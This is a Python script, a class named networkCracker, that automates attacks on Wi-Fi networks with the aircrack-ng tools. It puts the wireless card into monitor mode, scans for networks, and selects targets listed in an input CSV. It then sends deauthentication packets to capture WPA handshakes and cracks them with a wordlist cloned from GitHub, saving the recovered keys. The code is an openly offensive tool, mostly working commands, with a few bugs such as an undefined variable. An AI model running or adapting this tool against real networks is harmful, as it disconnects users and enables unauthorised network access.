import os
import sys, signal
import csv
import pandas as pd

class networkCracker:

	def __init__(self):
		self.interface = ""
		self.interfacemon ="" 
		self.wordlist = "wordlist.txt"
		self.scanWirelessCard()
		self.startMonitorMode()
		self.scanNetworks()
		self.readNetworksFile()
		self.stopMonitorMode()


	def scanWirelessCard(self):
		if os.path.exists('scanWCard.txt'):
			os.remove("scanWCard.txt")


		os.system('airmon-ng >> scanWCard.txt')
		f = open('scanWCard.txt', 'r')
		i = 0
		for line in f:
			for word in line.split():
				i+=1
				if i == 6:
					self.interface = word

	def startMonitorMode(self):	
		if os.path.exists("scanMonitor.txt"):
			os.remove("scanMonitor.txt")
	
		order = "airmon-ng start {} && airmon-ng check kill".format(self.interface)
		geny  = os.system(order)
		os.system('airmon-ng >> scanMonitor.txt')
		f = open('scanMonitor.txt', 'r')
		i = 0
		for line in f:
			for word in line.split():
				i+=1
				if i == 6:
					self.interfacemon = word


	def stopMonitorMode(self):
		order = "airmon-ng stop {} && service networking start && service network-manager start".format(self.interfacemon)
		geny = os.system(order)


	def downloadWordlist(self):
		if os.path.exists("/usr/share/wordlists/rockyou.txt") or os.path.exists(dir+"/Hob0Rules")==False:
			cmd = os.system("git clone https://github.com/praetorian-inc/Hob0Rules")
			sleep = os.system("sleep 3")
		if os.path.exists(dir+"/turkce-wordlist")==False:
			cmd = os.system("git clone https://github.com/utkusen/turkce-wordlist")

	def scanNetworks(self):
		if os.path.exists('networks-01.csv'):
			os.remove('networks-01.csv')
		order = f"airodump-ng {self.interfacemon} -M -w networks --output-format csv & sleep 20; kill $!"
		geny = os.system(order)

	def readNetworksFile(self):

		in_file = pd.read_csv("input.csv")
		inputCSV = in_file.copy()

		in_file1= pd.read_csv("networks-01.csv",sep=r'\s*,\s*',header=0, engine='python')
		outputCSV= in_file1.copy()

		inBSSID = list(inputCSV["BSSID"])
		outBSSID = list(outputCSV["BSSID"])
		networksCHs = []
		i = 1
		for item in outBSSID:
			if item in inBSSID:
				filter = outputCSV["BSSID"]==item
				ch = int(outputCSV[filter]["channel"])
				networksCHs.append([item,ch])
				dist = 10
				scan = "catfile"
				order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {} & sleep 2; kill $!".format(self.interfacemon,item,ch,scan,dist,item,self.interfacemon)
				geny = os.system(order)
				cmd  = os.system("sleep 5")
				if (os.path.exists("wordlist.txt") == False):
					self.wordlist = os.getcwd()+"/turkce-wordlist/wordlist.txt"


				path = scan+"-0"+str(i)+".cap"
				orders = ("aircrack-ng {} -0 -l {}.txt -w {} ").format(path,item,self.wordlist)
				genyy = os.system(orders)
				i+=1
		self.writeNetworkID(networksCHs);


	def writeNetworkID(self,networksCHs):
		with open('networkID.csv', 'w', newline='') as file:
			wr = csv.writer(file)
			wr.writerow(networksCHs)


if __name__ == '__main__':
	cracker = networkCracker()
